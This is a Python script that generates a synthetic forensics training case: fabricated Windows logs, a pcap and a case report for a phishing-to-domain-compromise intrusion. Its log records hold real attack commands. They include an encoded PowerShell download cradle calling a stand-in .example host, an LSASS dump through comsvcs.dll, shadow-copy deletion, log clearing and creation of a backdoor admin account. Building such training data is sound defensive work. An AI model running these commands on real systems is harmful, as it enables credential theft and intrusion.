#!/usr/bin/env python3
"""Generate the synthetic training case CASE-2026-011 ("Invoice Lure").

Everything here is fabricated for training and testing: the organisation,
people, hostnames, hashes and network indicators. Attacker infrastructure
uses reserved names and addresses only - the ``.example`` TLD (RFC 2606) and
the RFC 5737 documentation ranges (198.51.100.0/24, 203.0.113.0/24) - so no
indicator in this case points at a real system.

The script is deterministic (fixed seed): re-running it produces byte-identical
evidence, so the expected findings in the test-suite stay stable.

    python scripts/make_case.py [output_case_dir]
"""
from __future__ import annotations

import base64
import hashlib
import json
import random
import shutil
import struct
import sys
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path
from xml.sax.saxutils import escape

RNG = random.Random(20261118)
DAY = datetime(2026, 11, 18, tzinfo=timezone.utc)
DOMAIN, DOMAIN_FQDN = "MEGHNA", "meghna.local"

WS, WS_IP = "WS-FIN-07", "10.10.20.57"
DC, DC_IP = "DC01", "10.10.10.5"
WEB, WEB_IP = "WEB01", "10.10.30.10"
VICTIM, VICTIM_SID = "farhana.k", "S-1-5-21-3874928736-1902457330-2716843102-1107"
ADMIN = "adm.rahman"
STAGE_DOMAIN, STAGE_IP = "update.cdn-sync.example", "203.0.113.45"
C2_DOMAIN = "api.cdn-sync.example"
EXFIL_DOMAIN, EXFIL_IP = "files.cdn-sync.example", "203.0.113.50"
TUNNEL_PARENT = "t.tlmcache.example"
BRUTE_IP = "198.51.100.23"
IMPLANT = r"C:\Users\Public\Libraries\svchost.exe"


def t(h: int, m: int, s: float = 0) -> datetime:
    return DAY + timedelta(hours=h, minutes=m, seconds=s)


def iso(ts: datetime) -> str:
    return ts.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def guid(label: str) -> str:
    return "{" + str(uuid.uuid5(uuid.NAMESPACE_DNS, label)) + "}"


def fake_hashes(label: str) -> str:
    """Synthetic, obviously-derived hashes - not the hash of any real file."""
    seed = f"casekit-synthetic:{label}".encode()
    return (f"SHA1={hashlib.sha1(seed).hexdigest().upper()},MD5={hashlib.md5(seed).hexdigest().upper()},"
            f"SHA256={hashlib.sha256(seed).hexdigest().upper()},IMPHASH={hashlib.md5(seed[::-1]).hexdigest().upper()}")


def ps_encode(cmd: str) -> str:
    return base64.b64encode(cmd.encode("utf-16-le")).decode()


# ============================================================ Windows events

class Log:
    def __init__(self, channel: str, computer: str):
        self.channel, self.computer, self.records = channel, computer, []

    def add(self, ts: datetime, eid: int, **data):
        self.records.append((ts, eid, {k: str(v) for k, v in data.items()}))

    def sorted(self):
        return sorted(self.records, key=lambda r: r[0])

    def write_flat_jsonl(self, path: Path):
        with open(path, "w") as fh:
            for n, (ts, eid, data) in enumerate(self.sorted(), 1):
                fh.write(json.dumps({"TimeCreated": iso(ts), "Channel": self.channel, "Computer": self.computer,
                                     "EventID": eid, "EventRecordID": 10_000 + n, "EventData": data}) + "\n")

    def write_winlogbeat(self, path: Path):
        with open(path, "w") as fh:
            for n, (ts, eid, data) in enumerate(self.sorted(), 1):
                fh.write(json.dumps({"@timestamp": iso(ts), "winlog": {
                    "channel": self.channel, "computer_name": self.computer, "event_id": eid,
                    "record_id": 50_000 + n, "event_data": data}}) + "\n")

    def write_xml(self, path: Path):
        ns = "http://schemas.microsoft.com/win/2004/08/events/event"
        out = []
        for n, (ts, eid, data) in enumerate(self.sorted(), 1):
            fields = "".join(f'<Data Name="{k}">{escape(v)}</Data>' for k, v in data.items())
            out.append(
                f'<Event xmlns="{ns}"><System><Provider Name="Microsoft-Windows-Security-Auditing"/>'
                f"<EventID>{eid}</EventID><TimeCreated SystemTime=\"{ts.strftime('%Y-%m-%dT%H:%M:%S.%f')}0Z\"/>"
                f"<EventRecordID>{880_000 + n}</EventRecordID><Channel>{self.channel}</Channel>"
                f"<Computer>{self.computer}</Computer></System><EventData>{fields}</EventData></Event>")
        path.write_text("\n".join(out) + "\n")


class Sysmon(Log):
    def __init__(self, computer: str):
        super().__init__("Microsoft-Windows-Sysmon/Operational", computer)
        self.pids = {}

    def proc(self, ts, label, image, cmd, parent_label, user, integrity="Medium", hashes=None, cwd="C:\\Windows\\system32\\"):
        pid = RNG.randint(1200, 9800)
        parent = self.pids.get(parent_label, {"guid": guid(parent_label), "pid": RNG.randint(600, 1100),
                                              "image": parent_label, "cmd": parent_label})
        self.pids[label] = {"guid": guid(self.computer + label), "pid": pid, "image": image, "cmd": cmd}
        self.add(ts, 1, RuleName="-", UtcTime=ts.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                 ProcessGuid=self.pids[label]["guid"], ProcessId=pid, Image=image, CommandLine=cmd,
                 CurrentDirectory=cwd, User=user, IntegrityLevel=integrity,
                 Hashes=hashes or fake_hashes(image), ParentProcessGuid=parent["guid"],
                 ParentProcessId=parent["pid"], ParentImage=parent["image"], ParentCommandLine=parent["cmd"])
        return self.pids[label]

    def root(self, label, image, cmd):
        self.pids[label] = {"guid": guid(self.computer + label), "pid": RNG.randint(600, 6000), "image": image, "cmd": cmd}


def build_ws_sysmon() -> Sysmon:
    s = Sysmon(f"{WS}.{DOMAIN_FQDN}")
    u = f"{DOMAIN}\\{VICTIM}"
    s.root("explorer", r"C:\Windows\explorer.exe", r"C:\Windows\Explorer.EXE")

    # --- benign morning activity
    benign = [
        (t(8, 30, 12), "edge", r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", '"msedge.exe" --profile-directory=Default'),
        (t(8, 31, 40), "outlook", r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", '"OUTLOOK.EXE"'),
        (t(8, 33, 5), "teams", r"C:\Users\farhana.k\AppData\Local\Microsoft\Teams\current\Teams.exe", "Teams.exe --process-start-reason=AutoStart"),
        (t(8, 36, 51), "excel1", r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE", r'"EXCEL.EXE" "\\FS01\Finance\Q3-2026\ledger_oct.xlsx"'),
        (t(9, 14, 2), "notepad", r"C:\Windows\System32\notepad.exe", r'"notepad.exe" C:\Users\farhana.k\Desktop\todo.txt'),
        (t(9, 40, 33), "calc", r"C:\Windows\System32\calc.exe", '"calc.exe"'),
    ]
    for ts, label, img, cmd in benign:
        s.proc(ts, label, img, cmd, "explorer", u)
    s.root("services", r"C:\Windows\System32\services.exe", r"C:\Windows\system32\services.exe")
    for i, minute in enumerate((32, 47, 58, 61, 79, 95)):
        s.proc(t(8, 0) + timedelta(minutes=minute, seconds=RNG.randint(0, 59)), f"svc{i}",
               r"C:\Windows\System32\svchost.exe", r"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule",
               "services", "NT AUTHORITY\\SYSTEM", "System")
    s.add(t(8, 34, 0), 13, EventType="SetValue", Image=r"C:\Program Files\Microsoft OneDrive\OneDrive.exe",
          TargetObject=f"HKU\\{VICTIM_SID}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive",
          Details=r'"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background', User=u)

    # --- 08:41 phishing attachment opened
    docm = r"C:\Users\farhana.k\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\Q7Z1KD3M\Invoice_Nov2026.docm"
    s.add(t(8, 41, 5), 11, Image=s.pids["outlook"]["image"], TargetFilename=docm,
          ProcessGuid=s.pids["outlook"]["guid"], User=u)
    s.proc(t(8, 41, 22), "word", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
           f'"WINWORD.EXE" /n "{docm}" /o ""', "outlook", u)
    stage = f"IEX (New-Object Net.WebClient).DownloadString('http://{STAGE_DOMAIN}/assets/stage2.ps1')"
    s.proc(t(8, 41, 49), "ps1", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
           f"powershell.exe -nop -w hidden -enc {ps_encode(stage)}", "word", u, "High")
    s.add(t(8, 41, 51), 3, Image=s.pids["ps1"]["image"], ProcessGuid=s.pids["ps1"]["guid"], User=u,
          Protocol="tcp", SourceIp=WS_IP, SourcePort=49733, DestinationIp=STAGE_IP, DestinationPort=80,
          DestinationHostname=STAGE_DOMAIN)
    s.add(t(8, 42, 10), 11, Image=s.pids["ps1"]["image"], TargetFilename=IMPLANT,
          ProcessGuid=s.pids["ps1"]["guid"], User=u)
    s.proc(t(8, 42, 12), "implant", IMPLANT, f'"{IMPLANT}" -k netsvcs', "ps1", u, "High",
           hashes=fake_hashes("implant-svchost"), cwd="C:\\Users\\Public\\Libraries\\")
    s.add(t(8, 42, 13), 13, EventType="SetValue", Image=s.pids["ps1"]["image"],
          TargetObject=f"HKU\\{VICTIM_SID}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync",
          Details=IMPLANT, User=u)
    s.add(t(8, 42, 20), 3, Image=IMPLANT, ProcessGuid=s.pids["implant"]["guid"], User=u, Protocol="tcp",
          SourceIp=WS_IP, SourcePort=49741, DestinationIp=STAGE_IP, DestinationPort=443,
          DestinationHostname=C2_DOMAIN)

    # --- 08:55 hands-on-keyboard discovery
    for i, (ts, cmd) in enumerate([(t(8, 55, 3), "whoami /all"),
                                   (t(8, 55, 40), 'net group "domain admins" /domain'),
                                   (t(8, 56, 15), "nltest /domain_trusts /all_trusts")]):
        s.proc(ts, f"cmd_d{i}", r"C:\Windows\System32\cmd.exe", f"cmd.exe /c {cmd}", "implant", u, "High")
        exe = {"whoami": "whoami.exe", "net": "net.exe", "nltest": "nltest.exe"}[cmd.split()[0]]
        s.proc(ts + timedelta(seconds=0.2), f"d{i}", f"C:\\Windows\\System32\\{exe}", cmd, f"cmd_d{i}", u, "High")

    # --- 09:07 LSASS dump through comsvcs.dll
    s.proc(t(9, 7, 28), "cmd_dump", r"C:\Windows\System32\cmd.exe",
           r'cmd.exe /c tasklist /fi "imagename eq lsass.exe" & rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\Libraries\wct4E1.tmp full',
           "implant", u, "High")
    s.proc(t(9, 7, 30), "rundll", r"C:\Windows\System32\rundll32.exe",
           r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\Libraries\wct4E1.tmp full",
           "cmd_dump", u, "High")
    s.add(t(9, 7, 30, ), 10, SourceProcessGUID=s.pids["rundll"]["guid"], SourceProcessId=s.pids["rundll"]["pid"],
          SourceImage=r"C:\Windows\System32\rundll32.exe", TargetImage=r"C:\Windows\System32\lsass.exe",
          TargetProcessId=712, GrantedAccess="0x1FFFFF", SourceUser=u,
          CallTrace=r"C:\Windows\SYSTEM32\ntdll.dll+9d1b4|C:\Windows\System32\comsvcs.dll+3b9a1")
    s.add(t(9, 7, 33), 11, Image=r"C:\Windows\System32\rundll32.exe",
          TargetFilename=r"C:\Users\Public\Libraries\wct4E1.tmp", ProcessGuid=s.pids["rundll"]["guid"], User=u)

    # --- 09:48 collection + staging, 10:12 anti-recovery
    s.add(t(9, 47, 50), 11, Image=IMPLANT, TargetFilename=r"C:\Users\Public\Libraries\7za.exe",
          ProcessGuid=s.pids["implant"]["guid"], User=u)
    s.proc(t(9, 48, 0), "cmd_zip", r"C:\Windows\System32\cmd.exe",
           r'cmd.exe /c C:\Users\Public\Libraries\7za.exe a -pM3ghn@2026 -mhe=on C:\Users\Public\Libraries\fin_q3.7z "\\FS01\Finance\Q3-2026\*"',
           "implant", u, "High")
    s.proc(t(9, 48, 1), "zip", r"C:\Users\Public\Libraries\7za.exe",
           r'C:\Users\Public\Libraries\7za.exe a -pM3ghn@2026 -mhe=on C:\Users\Public\Libraries\fin_q3.7z "\\FS01\Finance\Q3-2026\*"',
           "cmd_zip", u, "High", hashes=fake_hashes("7za"))
    s.add(t(9, 52, 30), 3, Image=IMPLANT, ProcessGuid=s.pids["implant"]["guid"], User=u, Protocol="tcp",
          SourceIp=WS_IP, SourcePort=50112, DestinationIp=EXFIL_IP, DestinationPort=443,
          DestinationHostname=EXFIL_DOMAIN)
    s.proc(t(10, 12, 4), "cmd_vss", r"C:\Windows\System32\cmd.exe", "cmd.exe /c vssadmin delete shadows /all /quiet",
           "implant", u, "High")
    s.proc(t(10, 12, 5), "vss", r"C:\Windows\System32\vssadmin.exe", "vssadmin  delete shadows /all /quiet",
           "cmd_vss", u, "High")
    return s


def build_ws_security() -> Log:
    s = Log("Security", f"{WS}.{DOMAIN_FQDN}")
    s.add(t(7, 52, 10), 4624, TargetUserName=ADMIN, TargetDomainName=DOMAIN, LogonType=10,
          LogonProcessName="User32", AuthenticationPackageName="Negotiate", IpAddress="10.10.20.11",
          WorkstationName="IT-HD-02", KeyLength=0)
    s.add(t(7, 52, 10), 4672, SubjectUserName=ADMIN, SubjectDomainName=DOMAIN,
          PrivilegeList="SeDebugPrivilege SeBackupPrivilege SeTakeOwnershipPrivilege")
    s.add(t(8, 5, 44), 4634, TargetUserName=ADMIN, TargetDomainName=DOMAIN, LogonType=10)
    s.add(t(8, 29, 58), 4624, TargetUserName=VICTIM, TargetDomainName=DOMAIN, LogonType=2,
          LogonProcessName="User32", AuthenticationPackageName="Negotiate", IpAddress="127.0.0.1",
          WorkstationName=WS, KeyLength=0)
    for i in range(14):
        s.add(t(8, 30) + timedelta(minutes=RNG.randint(0, 110), seconds=RNG.randint(0, 59)), 4624,
              TargetUserName=f"{WS}$", TargetDomainName=DOMAIN, LogonType=3, LogonProcessName="Kerberos",
              AuthenticationPackageName="Kerberos", IpAddress=DC_IP, KeyLength=0)
    return s


def build_dc_logs():
    sec = Log("Security", f"{DC}.{DOMAIN_FQDN}")
    system = Log("System", f"{DC}.{DOMAIN_FQDN}")
    sysmon = Sysmon(f"{DC}.{DOMAIN_FQDN}")
    users = ["farhana.k", "tanvir.h", "nusrat.j", "imran.c", "sadia.r", "rakib.m", "adm.rahman", "fs01$", "web01$"]
    for i in range(70):
        ts = t(7, 45) + timedelta(seconds=RNG.randint(0, 3 * 3600))
        user = RNG.choice(users)
        sec.add(ts, 4624, TargetUserName=user, TargetDomainName=DOMAIN, LogonType=3, LogonProcessName="Kerberos",
                AuthenticationPackageName="Kerberos", IpAddress=f"10.10.20.{RNG.randint(20, 90)}", KeyLength=0,
                WorkstationName="-")
    for user, ts in (("nusrat.j", t(8, 12, 4)), ("nusrat.j", t(8, 12, 19)), ("imran.c", t(9, 21, 40))):
        sec.add(ts, 4625, TargetUserName=user, TargetDomainName=DOMAIN, LogonType=3, Status="0xC000006D",
                SubStatus="0xC000006A", IpAddress=f"10.10.20.{RNG.randint(20, 90)}", AuthenticationPackageName="NTLM")

    # --- 09:31 pass-the-hash with adm.rahman's NTLM hash from WS-FIN-07
    sec.add(t(9, 31, 10), 4624, TargetUserName=ADMIN, TargetDomainName=DOMAIN, LogonType=3,
            LogonProcessName="NtLmSsp ", AuthenticationPackageName="NTLM", LmPackageName="NTLM V2",
            IpAddress=WS_IP, IpPort=50021, WorkstationName=WS, KeyLength=0,
            TargetLogonId="0x8A41F3C")
    sec.add(t(9, 31, 10), 4672, SubjectUserName=ADMIN, SubjectDomainName=DOMAIN,
            PrivilegeList="SeSecurityPrivilege SeBackupPrivilege SeDebugPrivilege")
    system.add(t(9, 31, 11), 7045, ServiceName="PSEXESVC", ImagePath=r"%SystemRoot%\PSEXESVC.exe",
               ServiceType="user mode service", StartType="demand start", AccountName="LocalSystem")
    sysmon.root("services", r"C:\Windows\System32\services.exe", r"C:\Windows\system32\services.exe")
    sysmon.proc(t(9, 31, 11), "psexesvc", r"C:\Windows\PSEXESVC.exe", r"C:\Windows\PSEXESVC.exe", "services",
                "NT AUTHORITY\\SYSTEM", "System", hashes=fake_hashes("psexesvc"))
    sysmon.proc(t(9, 31, 14), "dc_cmd", r"C:\Windows\System32\cmd.exe", "cmd.exe", "psexesvc",
                f"{DOMAIN}\\{ADMIN}", "High")
    sysmon.proc(t(9, 32, 4), "dc_netuser", r"C:\Windows\System32\net.exe",
                "net user svc_backup Spr1ng#Backup26 /add /domain", "dc_cmd", f"{DOMAIN}\\{ADMIN}", "High")
    sec.add(t(9, 32, 5), 4720, TargetUserName="svc_backup", TargetDomainName=DOMAIN, SubjectUserName=ADMIN,
            SubjectDomainName=DOMAIN, SamAccountName="svc_backup", UserAccountControl="%%2080")
    sysmon.proc(t(9, 32, 19), "dc_netgroup", r"C:\Windows\System32\net.exe",
                'net group "Domain Admins" svc_backup /add /domain', "dc_cmd", f"{DOMAIN}\\{ADMIN}", "High")
    sec.add(t(9, 32, 20), 4728, TargetUserName="Domain Admins", TargetDomainName=DOMAIN,
            MemberName=f"CN=svc_backup,CN=Users,DC=meghna,DC=local", SubjectUserName=ADMIN, SubjectDomainName=DOMAIN)

    # --- 10:14 anti-forensics on the DC
    sysmon.proc(t(10, 14, 30), "dc_wevt", r"C:\Windows\System32\wevtutil.exe", "wevtutil  cl Security",
                "dc_cmd", f"{DOMAIN}\\{ADMIN}", "High")
    sec.add(t(10, 14, 31), 1102, SubjectUserName=ADMIN, SubjectDomainName=DOMAIN, SubjectLogonId="0x8A41F3C")
    return sec, system, sysmon


# ================================================================== network

class Pcap:
    def __init__(self):
        self.frames = []
        self.ip_id = RNG.randint(1000, 60000)
        self.seq = {}

    @staticmethod
    def _csum(data: bytes) -> int:
        if len(data) % 2:
            data += b"\0"
        s = sum(struct.unpack(f"!{len(data) // 2}H", data))
        while s >> 16:
            s = (s & 0xFFFF) + (s >> 16)
        return ~s & 0xFFFF

    def _ip(self, src, dst, proto, payload):
        self.ip_id = (self.ip_id + 1) & 0xFFFF
        hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(payload), self.ip_id, 0x4000, 64 if src.startswith("10.") else 52,
                          proto, 0, bytes(map(int, src.split("."))), bytes(map(int, dst.split("."))))
        hdr = hdr[:10] + struct.pack("!H", self._csum(hdr)) + hdr[12:]
        return hdr + payload

    def _frame(self, ts, ip_bytes):
        eth = bytes.fromhex("00155d0a1407") + bytes.fromhex("00155d0a2039") + b"\x08\x00"
        self.frames.append((ts, eth + ip_bytes))

    def udp(self, ts, src, sport, dst, dport, data):
        seg = struct.pack("!HHHH", sport, dport, 8 + len(data), 0) + data
        self._frame(ts, self._ip(src, dst, 17, seg))

    def tcp(self, ts, src, sport, dst, dport, data=b"", flags=0x18):
        key = (src, sport, dst, dport)
        seq = self.seq.get(key, RNG.randint(1, 2**31))
        ack = self.seq.get((dst, dport, src, sport), 0)
        seg = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, 5 << 4, flags, 64240, 0, 0) + data
        pseudo = struct.pack("!4s4sBBH", bytes(map(int, src.split("."))), bytes(map(int, dst.split("."))), 0, 6, len(seg))
        seg = seg[:16] + struct.pack("!H", self._csum(pseudo + seg)) + seg[18:]
        self.seq[key] = (seq + max(len(data), 1 if flags & 0x03 else 0)) & 0xFFFFFFFF
        self._frame(ts, self._ip(src, dst, 6, seg))

    def handshake(self, ts, c, cp, s, sp):
        self.tcp(ts, c, cp, s, sp, flags=0x02)
        self.tcp(ts + timedelta(milliseconds=40), s, sp, c, cp, flags=0x12)
        self.tcp(ts + timedelta(milliseconds=41), c, cp, s, sp, flags=0x10)

    def write(self, path: Path):
        with open(path, "wb") as fh:
            fh.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
            for ts, frame in sorted(self.frames, key=lambda f: f[0]):
                sec = int(ts.timestamp())
                usec = int(round((ts.timestamp() - sec) * 1e6))
                fh.write(struct.pack("<IIII", sec, usec, len(frame), len(frame)) + frame)


def dns_query(qid: int, name: str, qtype: int = 1) -> bytes:
    q = b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\0"
    return struct.pack("!HHHHHH", qid, 0x0100, 1, 0, 0, 0) + q + struct.pack("!HH", qtype, 1)


def dns_answer(qid: int, name: str, ip: str) -> bytes:
    q = b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\0"
    ans = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 300, 4) + bytes(map(int, ip.split(".")))
    return struct.pack("!HHHHHH", qid, 0x8180, 1, 1, 0, 0) + q + struct.pack("!HH", 1, 1) + ans


def client_hello(sni: str) -> bytes:
    name = sni.encode()
    sni_ext = struct.pack("!HHHBH", 0, len(name) + 5, len(name) + 3, 0, len(name)) + name
    exts = sni_ext + struct.pack("!HH", 0x000a, 4) + b"\x00\x02\x00\x1d"
    body = (b"\x03\x03" + bytes(RNG.getrandbits(8) for _ in range(32)) + b"\x00"
            + struct.pack("!H", 4) + b"\x13\x01\x13\x02" + b"\x01\x00" + struct.pack("!H", len(exts)) + exts)
    hs = b"\x01" + struct.pack("!I", len(body))[1:] + body
    return b"\x16\x03\x01" + struct.pack("!H", len(hs)) + hs


def app_data(n: int) -> bytes:
    return b"\x17\x03\x03" + struct.pack("!H", n) + bytes(RNG.getrandbits(8) for _ in range(n))


def build_pcap() -> Pcap:
    p = Pcap()
    port = iter(range(49700, 65000))

    def resolve(ts, name, ip, src=WS_IP):
        qid = RNG.randint(0, 65535)
        sp = next(port)
        p.udp(ts, src, sp, DC_IP, 53, dns_query(qid, name))
        p.udp(ts + timedelta(milliseconds=RNG.randint(8, 30)), DC_IP, 53, src, sp, dns_answer(qid, name, ip))

    # benign background: irregular lookups and HTTPS, plus a perfectly periodic
    # but allow-listed time sync check (shows the beacon analytic's allow-list)
    benign = {"outlook.office365.com": "52.98.0.1", "login.microsoftonline.com": "20.190.0.1",
              "www.bing.com": "13.107.21.200", "teams.microsoft.com": "52.113.194.132",
              "github.com": "140.82.112.3", "www.prothomalo.com": "104.18.0.1", "ecs.office.com": "52.109.0.1"}
    cursor = t(8, 30)
    while cursor < t(10, 30):
        name = RNG.choice(list(benign))
        resolve(cursor, name, benign[name])
        if RNG.random() < 0.5:
            sp, ts = next(port), cursor + timedelta(milliseconds=60)
            p.handshake(ts, WS_IP, sp, benign[name], 443)
            p.tcp(ts + timedelta(milliseconds=50), WS_IP, sp, benign[name], 443, client_hello(name))
            p.tcp(ts + timedelta(milliseconds=120), benign[name], 443, WS_IP, sp, app_data(RNG.randint(900, 1400)))
        cursor += timedelta(seconds=RNG.expovariate(1 / 55))
    for i in range(130):
        resolve(t(8, 30) + timedelta(seconds=60 * i), "time.windows.com", "168.61.215.74")

    # 08:41:50 stage-2 download over cleartext HTTP
    resolve(t(8, 41, 50), STAGE_DOMAIN, STAGE_IP)
    sp, ts = next(port), t(8, 41, 51)
    p.handshake(ts, WS_IP, sp, STAGE_IP, 80)
    req = (f"GET /assets/stage2.ps1 HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) "
           f"WindowsPowerShell/5.1.19041.4648\r\nHost: {STAGE_DOMAIN}\r\nConnection: Keep-Alive\r\n\r\n").encode()
    p.tcp(ts + timedelta(milliseconds=45), WS_IP, sp, STAGE_IP, 80, req)
    body = b"# synthetic training payload placeholder - CaseKit sample case\r\n" * 40
    p.tcp(ts + timedelta(milliseconds=210), STAGE_IP, 80, WS_IP, sp,
          b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: %d\r\n\r\n" % len(body) + body[:1300])

    # 08:42:20 -> 10:30 C2 beacon: DNS + TLS every 60s with small jitter
    ts = t(8, 42, 20)
    while ts < t(10, 30):
        resolve(ts, C2_DOMAIN, STAGE_IP)
        sp = next(port)
        p.handshake(ts + timedelta(milliseconds=50), WS_IP, sp, STAGE_IP, 443)
        p.tcp(ts + timedelta(milliseconds=95), WS_IP, sp, STAGE_IP, 443, client_hello(C2_DOMAIN))
        p.tcp(ts + timedelta(milliseconds=180), STAGE_IP, 443, WS_IP, sp, app_data(RNG.randint(90, 400)))
        ts += timedelta(seconds=60 + RNG.uniform(-4, 4))

    # 09:52:30 exfiltration of fin_q3.7z over TLS (~1.6 MB)
    resolve(t(9, 52, 29), EXFIL_DOMAIN, EXFIL_IP)
    sp, ts = next(port), t(9, 52, 30)
    p.handshake(ts, WS_IP, sp, EXFIL_IP, 443)
    p.tcp(ts + timedelta(milliseconds=50), WS_IP, sp, EXFIL_IP, 443, client_hello(EXFIL_DOMAIN))
    for i in range(1150):
        p.tcp(ts + timedelta(milliseconds=200 + i * 61), WS_IP, sp, EXFIL_IP, 443, app_data(1395))
        if i % 20 == 0:
            p.tcp(ts + timedelta(milliseconds=230 + i * 61), EXFIL_IP, 443, WS_IP, sp, flags=0x10)

    # 10:05 DNS tunnelling of the credential dump (base32 chunks)
    blob = bytes(RNG.getrandbits(8) for _ in range(1400))
    chunk_b32 = base64.b32encode(blob).decode().rstrip("=").lower()
    for i in range(0, 44):
        label = chunk_b32[i * 52:(i + 1) * 52]
        if not label:
            break
        name = f"{label[:52]}.{i:03d}.{TUNNEL_PARENT}"
        qid = RNG.randint(0, 65535)
        p.udp(t(10, 5) + timedelta(seconds=i * 2.1), WS_IP, next(port), DC_IP, 53, dns_query(qid, name, 16))
    return p


# ===================================================================== linux

def build_authlog() -> str:
    lines = []
    def ln(ts, proc, msg):
        lines.append((ts, f"{ts:%b %d %H:%M:%S} web01 {proc}: {msg}"))
    ln(t(6, 58, 2), "sshd[1022]", "Server listening on 0.0.0.0 port 22.")
    ln(t(7, 3, 11), "sshd[2210]", "Accepted publickey for deploy from 10.10.20.11 port 52144 ssh2: ED25519 SHA256:q2Xr0Hk1x4W8u2f2r7mY3qv9cZk8b1aS0dKk3n2Lw6E")
    ln(t(7, 3, 40), "sudo", "  deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx")
    users = ["root", "admin", "ubuntu", "test", "oracle", "postgres", "user", "git", "deploy", "ftpuser"]
    ts = t(7, 40, 3)
    for i in range(64):
        u = RNG.choice(users)
        pid = 3100 + i
        port = RNG.randint(30000, 65000)
        if u not in ("root", "deploy"):
            ln(ts, f"sshd[{pid}]", f"Invalid user {u} from {BRUTE_IP} port {port}")
            ln(ts + timedelta(seconds=1.4), f"sshd[{pid}]", f"Failed password for invalid user {u} from {BRUTE_IP} port {port} ssh2")
        else:
            ln(ts + timedelta(seconds=1.4), f"sshd[{pid}]", f"Failed password for {u} from {BRUTE_IP} port {port} ssh2")
        ts += timedelta(seconds=RNG.uniform(3, 7))
    ln(ts + timedelta(seconds=5), "sshd[3199]", f"Connection closed by {BRUTE_IP} port 41022 [preauth]")
    return "\n".join(l for _, l in sorted(lines, key=lambda x: x[0])) + "\n"


# ===================================================================== case

CASE_YML = """\
case_id: CASE-2026-011
title: "Invoice Lure — phishing to domain compromise and data theft"
organisation: Meghna Logistics Ltd (fictional training organisation)
examiner: Ahnaf Akif
classification: TLP:AMBER — synthetic training case
year: 2026
disclaimer: >-
  Synthetic case generated by scripts/make_case.py for training and tool validation. All people,
  hosts, hashes and indicators are fabricated; attacker infrastructure uses reserved .example
  names and RFC 5737 documentation IP ranges.
hosts:
  10.10.20.57: WS-FIN-07
  10.10.10.5: DC01
  10.10.30.10: WEB01
summary: |
  On 18 November 2026 a finance user on **WS-FIN-07** opened a macro-enabled attachment
  (`Invoice_Nov2026.docm`) delivered by email. The macro ran an encoded PowerShell download
  cradle that fetched a second stage over HTTP and installed an implant masquerading as
  `svchost.exe` in `C:\\Users\\Public\\Libraries`, persisted through a `Run` key, and beaconed to
  `api.cdn-sync[.]example` every ~60 seconds.

  About 25 minutes later the operator dumped LSASS memory with `comsvcs.dll MiniDump`. The
  domain-admin credentials of **adm.rahman** were exposed because that account had logged on
  interactively (RDP) to the workstation for helpdesk work at 07:52. At 09:31 the attacker used
  the account's NTLM hash to authenticate to **DC01** (pass-the-hash), executed commands through
  PsExec, and created a backdoor domain admin, **svc_backup**.

  Finance data from `\\\\FS01\\Finance\\Q3-2026` was compressed into a password-protected archive and
  ~1.6 MB was sent over TLS to `203.0.113[.]50`; a second, DNS-tunnelled channel to
  `tlmcache[.]example` carried a further ~1.4 KB (2.2 KB base32-encoded) - consistent with a
  credential-dump extract or key material. The attacker deleted the
  workstation's shadow copies and cleared the DC01 Security log. DC01 events were recovered from
  the Windows Event Forwarding collector, which retained them after the local clear.

  An unrelated, unsuccessful SSH password-guessing run against internet-facing **WEB01** from
  `198.51.100[.]23` was also observed; it is assessed as opportunistic background noise.

  **Assessment:** full domain compromise with confirmed data exfiltration. Severity: Critical.
recommendations:
  - "Immediately isolate WS-FIN-07 from the network (EDR containment) and preserve a memory image and disk image before reimaging."
  - "Disable svc_backup and reset adm.rahman; then reset the krbtgt password twice (with replication between resets) because a domain admin was fully compromised."
  - "Block cdn-sync[.]example, tlmcache[.]example, 203.0.113[.]45 and 203.0.113[.]50 at DNS, proxy and firewall; sweep the estate for the implant hash and the OneDriveSync Run value."
  - "Stop domain admins logging on to workstations: use a tiered admin model, Privileged Access Workstations and the Protected Users group."
  - "Remove local administrator rights from standard users; block Office macros from internet-sourced files by Group Policy."
  - "Engage legal/DPO: Q3 finance data was exfiltrated - assess notification obligations."
conclusion: |
  The intrusion progressed from a single opened attachment to domain-admin control in under an
  hour. Two control gaps made that speed possible: a privileged account's credentials resident on
  a standard workstation, and a standard user with local administrator rights (needed to read
  LSASS). Centralised log forwarding preserved the evidence the attacker tried to destroy, and is
  the reason this reconstruction is complete.
"""


def main(out: Path) -> None:
    if out.exists():
        shutil.rmtree(out)
    ev = out / "evidence"
    for d in (WS, DC, WEB, "network"):
        (ev / d).mkdir(parents=True)
    build_ws_sysmon().write_flat_jsonl(ev / WS / f"{WS}_Sysmon.jsonl")
    build_ws_security().write_flat_jsonl(ev / WS / f"{WS}_Security.jsonl")
    sec, system, sysmon = build_dc_logs()
    sec.write_xml(ev / DC / f"{DC}_Security_WEF.xml")
    system.write_winlogbeat(ev / DC / f"{DC}_System.winlogbeat.jsonl")
    sysmon.write_winlogbeat(ev / DC / f"{DC}_Sysmon.winlogbeat.jsonl")
